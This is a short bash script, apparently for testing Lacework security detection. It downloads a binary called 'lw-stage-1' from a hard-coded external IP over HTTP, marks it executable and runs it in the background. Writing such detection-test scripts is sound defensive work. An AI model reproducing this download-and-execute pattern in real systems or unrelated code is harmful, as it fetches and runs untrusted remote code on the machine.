#!/bin/bash
# Script to simulate activity that will trigger Lacework events

EXT_IP="54.184.116.123"
FILENAME="lw-stage-1"
BIN_URL="http://${EXT_IP}/bin/${FILENAME}"

download_exec_binary() {
        # Download the first stage binary
        echo "Downloading ${FILENAME}..."
        if [[ $(curl -s -w "%{http_code}\\n" -X GET ${BIN_URL} -o ${FILENAME}) -eq 200 ]]
        then
                echo " - Successfully downloaded ${FILENAME}!"
        else
                echo " - Failed to download ${FILENAME}!"
        fi

        # Change permissions so it can be executed
        echo "changing permissins on ${FILENAME} to allow execution..."
        chmod u+x ${FILENAME}
        if [[ $? -eq 0 ]]
        then
                echo " - Successfully changed permissions"
        else
                echo " - Failed to change permissions on ${FILENAME}!"
        fi

        # Execute the binary
        echo "Executing ${FILENAME}..."
        ./${FILENAME} &
        if [[ $? -eq 0 ]]
        then
                echo " - Successfully executed ${FILENAME}!"
        else
                echo " - Failed to execute ${FILENAME}!"
        fi
}

download_exec_binary
echo "Script finished, terminating."
